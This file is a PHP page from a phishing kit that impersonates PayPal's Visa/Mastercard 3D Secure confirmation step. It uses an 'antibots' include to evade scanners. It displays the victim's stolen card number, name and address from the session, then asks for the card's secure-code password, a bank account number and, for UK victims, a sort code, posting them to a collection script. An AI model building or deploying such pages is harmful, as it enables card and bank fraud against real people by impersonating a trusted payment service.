<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE html>
<html>
<head>
    <title>Confirm VBV/3D Secure - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <link href="css/app.css" type="text/css" rel="stylesheet">
    <script src="css/jquery.js" type="text/javascript"></script>
    <script src="css/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<style>
    .content_check{
        width: 330px;
        margin-right: auto;
        margin-left: auto;
        margin-top: 15px;
    }
    .content_check .small_title{
        font-size: 12px;
    }
    .content_info{
       text-align: center;
        margin-top: 30px;
    }
    td{
        line-height: 18px;
        vertical-align: top;
    }

</style>
<body>
<div class="content_check">
    <?php
    $card = substr($_SESSION['cardNumber'],0,1);
   if($card == 5 ){
       echo '<img src="css/noobms.gif">';
   }else if($card == 4 ){
      echo '<img src="css/noobvbv.gif">';
   }
    ?>
    <img src="css/noobppl.svg" style="float: right;display: inline-block" width="128px">
    <p style="font-size: 13px; margin-top: 25px; color: #807979;">Please enter your Secure Code </p>
    <table align="center" width="290" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 30px;">
        <tbody>
        <tr>
            <td align="right">Name of cardholder</td>
            <td><?php echo $_SESSION['legalfirstname'].' '.$_SESSION['legallastname'] ?></td>
        </tr>
        <tr>
            <td align="right">Zip Code</td>
            <td><?php echo $_SESSION['zip'];?></td>
        </tr>
        <tr>
            <td align="right">Country</td>
            <td><?php echo $_SESSION['country'];?></td>
        </tr>
        <tr>
            <td align="right">Card Number</td>
            <td><?php echo $_SESSION['cardNumber'];?></td>
        </tr>
        <tr>
            <form method="post" action="vbv_verif.php?y=<?php md5("nassim"); ?>">
            <td align="right">Password</td>
            <td><input style="width: 75px;" type="text" name="password_vbv"></td>
        </tr>
        <tr>
            <form method="post" action="vbv_verif.php?y=<?php md5("nassim"); ?>">
            <td align="right">Account Number</td>
            <td><input style="width: 75px;" type="text" name="account_numbervbv"></td>
        </tr>
        <?php
        if($_SESSION['country']=="United Kingdom"){
            echo '
             <tr>
            <td align="right">Sort Code</td>
            <td><input required style="width: 75px;" type="text" id="sortcode" name="sort_code" placeholder="XX-XX-XX"></td>
        </tr>
            ';
        }

        ?>

        <tr>
            <td></td>
            <td><br>
                <input type="submit" value="Submit">
                </form>
            </td>
        </tr>
       </tbody>
    </table>
    <p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565">
        Copyright © 1999-2016 . All rights reserved.
    </p>
</div>
<script>
    jQuery(function($){
        $("#sortcode").mask("99-99-99");
    });
</script>
</body>
</html>
